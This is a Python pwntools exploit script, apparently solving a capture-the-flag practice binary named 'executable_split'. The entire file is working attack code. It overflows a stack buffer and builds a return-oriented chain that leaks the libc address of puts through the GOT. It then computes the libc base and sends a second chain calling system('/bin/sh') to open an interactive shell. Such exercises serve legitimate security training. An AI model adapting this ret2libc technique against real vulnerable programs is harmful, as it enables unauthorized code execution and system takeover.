#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# import executable
exe = context.binary = ELF(args.EXE or 'executable_split')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# import libc for symbol pointers
libc_so = ELF(args.LIBC or '/usr/lib/x86_64-linux-gnu/libc.so.6')

# -- Exploit goes here --

io = start()

# Overflow bytes
main_location = 0x0000000000400697 # main()
got_puts_entry = 0x601018 # [0x601018] puts@GLIBC_2.2.5 -> 0x7ffff7c7aa10 (puts)
puts_location = 0x0000000000400550 # location of puts() because of plt
rdi_gadget_location = 0x00000000004007c3 # pop rdi; ret;
print_flag_string = 0x0000000000601060 # "/bin/cat flag.txt"
system_location = 0x000000000040074b # runs syscall

buffer = b'A' * 32 # 32 bytes of padding to fill up allocated buffer space
buffer += b'A' * 8 # 8 bytes of random to account for the "push rbp;"
buffer += p64(rdi_gadget_location) # jump to "pop rdi; ret;"
#buffer += p64(print_flag_string)
buffer += p64(got_puts_entry)
buffer += p64(puts_location) # print the value behind in rdi
buffer += p64(main_location) # go back to main for further instruction

io.send(buffer)

for i in range(5): io.recvline() # clear the random outputs

response = io.recvline()
puts_libc_location = u64(response.strip() + b'\x00' * 2) # add two nullbytes because 1) puts doesn't print it, 2) we removed a '\n' during strip()
print("recieved:")
print(response)
print("decoded as: ")
print(puts_libc_location)
print("in hex: ")
print(hex(puts_libc_location))

libc_base = puts_libc_location - libc_so.symbols['puts']
print("libc_base:")
print(hex(libc_base))

shell_command_string = next(libc_so.search(b'/bin/sh')) + libc_base
exit_libc_location = libc_so.symbols['exit'] + libc_base
system_libc_location = libc_so.symbols['system'] + libc_base
ret_gadget_location = main_location + 80

buffer = b'A' * 32 # 32 bytes of padding to fill up allocated buffer space
buffer += b'A' * 8 # 8 bytes of random to account for the "push rbp;"
buffer += p64(rdi_gadget_location) # jump to "pop rdi; ret;"
buffer += p64(shell_command_string)
#buffer += p64(print_flag_string)
buffer += p64(ret_gadget_location) # allign to 16 bytes
buffer += p64(system_libc_location)

io.send(buffer)

io.interactive() # interative bash shell unlocked
